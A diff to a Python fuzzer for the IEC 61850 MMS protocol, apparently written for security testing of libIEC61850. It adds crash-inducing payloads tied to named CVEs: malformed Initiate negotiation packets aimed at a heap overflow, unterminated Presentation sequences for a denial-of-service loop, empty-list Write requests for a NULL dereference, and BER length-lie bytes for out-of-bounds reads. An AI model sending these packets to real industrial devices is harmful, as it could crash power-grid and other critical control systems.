@@ -228,6 +228,30 @@ class MMSFuzzer(BaseFuzzer):
                 requires_state="CONNECTED",
             ),
             RequestInfo(
+                "MMS_Initiate_Negotiation",
+                "Mutate MMS Initiate negotiation fields (proposedMaxPduSize, "
+                "maxServOutstanding calling/called, nestingLevel, service-support "
+                "bitstring) - crafted Initiate heap overflow (CVE-2026-49035). "
+                "Runs its own association so it never poisons stateful setup.",
+                "crash",
+                requires_state="COTP_ESTABLISHED",
+            ),
+            RequestInfo(
+                "MMS_Presentation_NormalMode",
+                "Malformed ISO Presentation normal-mode-parameters sequence - "
+                "parseNormalModeParameters infinite loop / DoS (CVE-2022-21159)",
+                "crash",
+                requires_state="CONNECTED",
+            ),
+            RequestInfo(
+                "MMS_BER_Length_OOB",
+                "BER length-lie / extended-tag / zero-length AP-title OOB reads "
+                "across the confirmed-request corpus (CVE-2026-65421, "
+                "CVE-2026-66349, CVE-2026-63550, CVE-2026-56758)",
+                "crash",
+                requires_state="MMS_ASSOCIATED",
+            ),
+            RequestInfo(
                 "MMS_DeleteNamedVariableList",
                 "DeleteNamedVariableList w/ malformed name + scopeOfDelete "
                 "sweep, plus oversized DefineNamedVariableList (CVE-2024-26529)",
@@ -245,6 +269,13 @@ class MMSFuzzer(BaseFuzzer):
                 "MMS_OctetString_Length_Lie",
                 "Write MMS_OCTET_STRING w/ BER length larger than octets "
                 "present, truncated at tail (over-read)",
+                "crash",
+                requires_state="MMS_ASSOCIATED",
+            ),
+            RequestInfo(
+                "MMS_Write_EmptyVarList",
+                "Write to a Named Variable List with an empty listOfData - "
+                "NULL deref (CVE-2026-50032, CWE-476)",
                 "crash",
                 requires_state="MMS_ASSOCIATED",
             ),
@@ -842,6 +873,84 @@ class MMSFuzzer(BaseFuzzer):
         content.extend(encode_ber_context_tag(4, init_detail, True))
 
         return bytes([self.PDU_INITIATE_REQUEST]) + encode_ber_length(len(content)) + bytes(content)
+
+    def _create_fuzzable_initiate_pdu(
+        self,
+        local_detail: bytes = b"\xff\xff",
+        serv_calling: bytes = b"\x05",
+        serv_called: bytes = b"\x05",
+        nesting_level: bytes = b"\x0a",
+        proposed_cbb: bytes = b"\x05\xf1\x00",
+        services_supported: bytes = b"\x03\xee\x1c\x00\x00\x04\x08\x00\x00\x79\xef\x18",
+    ) -> bytes:
+        """Build an MMS Initiate-RequestPDU with attacker-controlled negotiation
+        fields for CVE-2026-49035 (heap overflow, CWE-122, CVSS 9.2 RCE-class,
+        via a crafted MMS Initiate request; CISA ICSA-26-204-06).
+
+        Each argument is the raw BER *value* octets for one negotiation field so
+        callers can inject oversized / zero / boundary values while the
+        surrounding framing stays valid (encode_ber_context_tag recomputes each
+        field length). Mirrors the field layout of _create_initiate_request but
+        makes every negotiation parameter a mutation point.
+        """
+        content = bytearray()
+        # [0] localDetailCalling == proposedMaxPduSize (initRequestDetail driver)
+        content.extend(encode_ber_context_tag(0, local_detail, False))
+        # [1] proposedMaxServOutstanding-calling
+        content.extend(encode_ber_context_tag(1, serv_calling, False))
+        # [2] proposedMaxServOutstanding-called
+        content.extend(encode_ber_context_tag(2, serv_called, False))
+        # [3] proposedDataStructureNestingLevel
+        content.extend(encode_ber_context_tag(3, nesting_level, False))
+        # [4] initRequestDetail SEQUENCE
+        init_detail = (
+            encode_ber_context_tag(0, b"\x01", False)  # proposedVersionNumber
+            + encode_ber_context_tag(1, proposed_cbb, False)  # proposedParameterCBB (BIT STRING)
+            + encode_ber_context_tag(2, services_supported, False)  # servicesSupportedCalling
+        )
+        content.extend(encode_ber_context_tag(4, init_detail, True))
+        return bytes([self.PDU_INITIATE_REQUEST]) + encode_ber_length(len(content)) + bytes(content)
+
+    def _build_initiate_negotiation_variants(self) -> List[bytes]:
+        """Full-stack MMS Initiate packets with mutated negotiation fields
+        (CVE-2026-49035).
+
+        Each entry is a complete, correctly-framed packet (the OSI wrapper
+        recomputes its own lengths around the mutated Initiate) so the malicious
+        Initiate actually reaches libIEC61850's parser instead of being rejected
+        at an outer OSI layer. This request runs on its own connection and does
+        NOT reuse the pristine Initiate from _define_state_machine, so the
+        stateful association used by MMS_ASSOCIATED-state requests is never
+        poisoned by these mutations.
+        """
+        mutations: List[dict] = [
+            # proposedMaxPduSize (localDetailCalling): boundary / oversized / zero
+            {"local_detail": b"\x00"},  # zero max PDU
+            {"local_detail": b""},  # zero-length integer
+            {"local_detail": b"\xff\xff"},  # 65535
+            {"local_detail": b"\x7f\xff\xff\xff"},  # ~2GB
+            {"local_detail": b"\xff\xff\xff\xff"},  # -1 / uint32 max
+            {"local_detail": b"\x00" * 8},  # 8-byte oversized encoding
+            # proposedMaxServOutstanding calling / called
+            {"serv_calling": b"\x00", "serv_called": b"\x00"},  # zero outstanding
+            {"serv_calling": b"\xff\xff\xff\xff"},  # oversized calling
+            {"serv_called": b"\x7f\xff\xff\xff"},  # oversized called
+            # proposedDataStructureNestingLevel (drives recursive-decode depth)
+            {"nesting_level": b"\x00"},  # zero nesting
+            {"nesting_level": b"\xff"},  # 255 nesting
+            {"nesting_level": b"\x7f\xff\xff\xff"},  # oversized nesting
+            # service-support bitstring: illegal unused-bits octet (>7) + length lie
+            {"proposed_cbb": b"\x08\xff", "services_supported": b"\x08\xff"},
+            {"services_supported": b"\x81\xff\xc0"},  # bitstring BER length lie
+        ]
+        packets: List[bytes] = []
+        for mutation in mutations:
+            pdu = self._create_fuzzable_initiate_pdu(**mutation)
+            if self.use_osi_stack:
+                packets.append(self.osi_stack.build_initiate_request(pdu))
+            else:
+                packets.append(pdu)
+        return packets
 
     def _wrap_with_osi_stack(self, mms_pdu: bytes, is_initiate: bool = False) -> bytes:
         """
@@ -1701,6 +1810,134 @@ class MMSFuzzer(BaseFuzzer):
         )
 
         # ================================================================
+        # libIEC61850 1.0.0-1.6.1 REAL-CRASH REQUESTS
+        # (CISA ICSA-26-204-06 / ICSA-26-211-10, Talos)
+        # ================================================================
+
+        # MMS Initiate-Request negotiation fuzzing - CVE-2026-49035 heap overflow
+        # (CWE-122, CVSS 9.2, RCE-class). The pristine Initiate is used ONLY to
+        # bring up the association in _define_state_machine; here we make the
+        # Initiate itself a fuzzable attack surface. Each Group value is a fully
+        # framed packet that establishes its OWN association, so mutating the
+        # negotiation fields never poisons the stateful setup other requests
+        # (MMS_ASSOCIATED) depend on.
+        initiate_negotiation_req = Request(
+            name="MMS_Initiate_Negotiation",
+            children=(
+                Group(
+                    name="initiate_variants",
+                    values=self._build_initiate_negotiation_variants(),
+                ),
+            ),
+        )
+
+        # ISO Presentation parseNormalModeParameters infinite loop / DoS -
+        # CVE-2022-21159 (CWE-835, EPSS ~77%, TALOS-2022-1467). Malformed
+        # normal-mode-parameters [2] SEQUENCE inside the CP-type SET, delivered
+        # over a Session CONNECT SPDU (the association / CP layer, pre-MMS).
+        pres_normalmode_req = Request(
+            name="MMS_Presentation_NormalMode",
+            children=(
+                Static(name="tpkt_header", default_value=b"\x03\x00\x00\x14"),
+                Static(name="cotp_dt", default_value=b"\x02\xf0\x80"),
+                Static(name="session_connect", default_value=b"\x0d\x00"),  # Session CONNECT SPDU
+                # CP-type SET (0x31) { mode-selector [0], normal-mode-parameters [2] }
+                Static(name="cp_type_set_tag", default_value=b"\x31"),
+                Static(name="cp_type_len", default_value=b"\x80"),  # indefinite -> streaming parse
+                Static(name="mode_selector", default_value=b"\xa0\x03\x80\x01\x01"),
+                Static(name="normal_mode_tag", default_value=b"\xa2"),  # [2] normal-mode-parameters
+                Group(
+                    name="normal_mode_body",
+                    values=[
+                        b"\x80",  # indefinite length, never terminated
+                        b"\x00",  # empty normal-mode-parameters
+                        b"\x81\xff",  # length lie: claims 255, no content
+                        b"\x04\xa4\x80\x00\x00",  # context-def-list [4] indefinite, empty
+                        b"\x06\xa4\x03\x30\x80\x00",  # nested SEQUENCE indefinite, unterminated
+                        b"\x05\xa4\x81\xff\x00\x00",  # context-def-list length lie
+                        b"\x03\xa0\x80\x00",  # unterminated sub-field
+                    ],
+                ),
+            ),
+        )
+
+        # Write to a Named Variable List with an EMPTY listOfData - CVE-2026-50032
+        # NULL deref (CWE-476). variableAccessSpecification names a variable list
+        # ([1] variableListName -> ObjectName) but listOfData [0] carries zero
+        # Data elements. Each Group value is a fully framed packet.
+        _domain = self.config.get_option("domain_name", "AA11")
+        _vmd_list = encode_ber_context_tag(
+            1, encode_ber_context_tag(0, b"FUZZLIST", False), True
+        )  # variableListName [1] -> vmd-specific ObjectName [0]
+        _dom_list = encode_ber_context_tag(
+            1,
+            encode_ber_context_tag(
+                1,
+                encode_ber_context_tag(0, _domain.encode("ascii"), False)
+                + encode_ber_context_tag(1, b"FUZZLIST", False),
+                True,
+            ),
+            True,
+        )  # variableListName [1] -> domain-specific ObjectName [1]
+        _aa_list = encode_ber_context_tag(
+            1, encode_ber_context_tag(2, b"FUZZLIST", False), True
+        )  # variableListName [1] -> aa-specific ObjectName [2]
+        _empty_lod = b"\xa0\x00"  # listOfData [0] with zero Data elements
+        _null_lod = b"\xa0\x02\x80\x00"  # listOfData [0] w/ one empty Data
+
+        def _build_empty_varlist_pkt(access_spec: bytes, list_of_data: bytes) -> bytes:
+            pdu = self._create_confirmed_request(
+                self._next_invoke_id(), self.SERVICE_WRITE, access_spec + list_of_data
+            )
+            return wrap_in_tpkt_cotp(pdu) if self.use_osi_stack else pdu
+
+        write_empty_varlist_req = Request(
+            name="MMS_Write_EmptyVarList",
+            children=(
+                Group(
+                    name="empty_varlist_variants",
+                    values=[
+                        _build_empty_varlist_pkt(_vmd_list, _empty_lod),  # primary NULL-deref path
+                        _build_empty_varlist_pkt(_dom_list, _empty_lod),
+                        _build_empty_varlist_pkt(_aa_list, _empty_lod),
+                        _build_empty_varlist_pkt(_vmd_list, _null_lod),  # one empty Data element
+                    ],
+                ),
+            ),
+        )
+
+        # BER length-lie / extended-tag / zero-length AP-title OOB reads across
+        # the confirmed-request corpus - CVE-2026-65421 / -66349 / -63550 /
+        # -56758 (OOB read family). Extends the OCTET_STRING/BIT_STRING length
+        # lie to fixed-width BER primitives (INTEGER/BOOLEAN with unvalidated
+        # length), extended multi-byte BER tags, and a zero-length ACSE AARQ
+        # calling-AP-title. Raw probes fired straight at the ASN.1 length parser
+        # (COTP DT + body), matching this file's other raw length-lie requests.
+        ber_length_oob_req = Request(
+            name="MMS_BER_Length_OOB",
+            children=(
+                Static(name="tpkt_header", default_value=b"\x03\x00\x00\x10"),
+                Static(name="cotp_dt", default_value=b"\x02\xf0\x80"),
+                Group(
+                    name="ber_oob_body",
+                    values=[
+                        # fixed-width BER primitive length lies (INTEGER / BOOLEAN)
+                        b"\xa0\x0a\x02\x7f\x01\xa4\x03\x80\x01\x00",  # invokeID INTEGER len=0x7f, 1 byte
+                        b"\xa0\x08\x02\x01\x01\xa4\x03\x01\x04\xff",  # BOOLEAN len=4, 1 byte present
+                        b"\xa0\x06\x02\x01\x01\xa4\xff\x30",  # Read service [4] length lie 0xff
+                        # extended (multi-byte high-tag-number) BER tags
+                        b"\xa0\x06\x02\x01\x01\x1f\x81\x00\x00",  # high-tag primitive 1f 81 00
+                        b"\xa0\x08\x02\x01\x01\x3f\x81\x7f\x82\xff\xff",  # constructed high-tag + len lie
+                        b"\xa0\x05\x1f\xff\x7f\x01\x00",  # oversized multi-byte tag number
+                        # zero-length ACSE AARQ calling-AP-title (context [6])
+                        b"\x60\x0a\xa1\x02\x06\x00\xa6\x00\xa7\x00",  # AARQ, calling-AP-title a6 00
+                        b"\x60\x08\xa2\x00\xa6\x00\xa7\x00\x00",  # zero-len called + calling AP-title
+                    ],
+                ),
+            ),
+        )
+
+        # ================================================================
         # OPTIMIZED REQUEST ORDERING (session.connect calls)
         # ================================================================
 
@@ -1726,6 +1963,14 @@ class MMSFuzzer(BaseFuzzer):
         if self.is_request_enabled("MMS_OSI_Layer"):
             self._add_osi_layer_tests()
 
+        # Crafted MMS Initiate negotiation heap overflow (CVE-2026-49035)
+        if self.is_request_enabled("MMS_Initiate_Negotiation"):
+            self.session.connect(initiate_negotiation_req)
+
+        # Presentation parseNormalModeParameters infinite loop (CVE-2022-21159)
+        if self.is_request_enabled("MMS_Presentation_NormalMode"):
+            self.session.connect(pres_normalmode_req)
+
         # DeleteNamedVariableList DoS (CVE-2024-26529) + oversized Define
         if self.is_request_enabled("MMS_DeleteNamedVariableList"):
             self.session.connect(delete_nvl_req)
@@ -1739,11 +1984,20 @@ class MMSFuzzer(BaseFuzzer):
         if self.is_request_enabled("MMS_OctetString_Length_Lie"):
             self.session.connect(octetstring_req)
 
+        # BER length-lie / extended-tag / zero-length AP-title OOB read family
+        # (CVE-2026-65421 / -66349 / -63550 / -56758)
+        if self.is_request_enabled("MMS_BER_Length_OOB"):
+            self.session.connect(ber_length_oob_req)
+
         # ==================== PHASE 3: CVE-TARGETED OPERATIONS (~3 min) ====================
         # Write operations (primary CVE target)
         if self.is_request_enabled("MMS_Write_Operations"):
             self.session.connect(write_req)
             self.session.connect(write_overflow)
+
+        # Write to Named Variable List with empty listOfData NULL deref (CVE-2026-50032)
+        if self.is_request_enabled("MMS_Write_EmptyVarList"):
+            self.session.connect(write_empty_varlist_req)
 
         # Control operations (IEC 61850 CVE-2019-6604)
         if self.is_request_enabled("MMS_Control_Operations"):
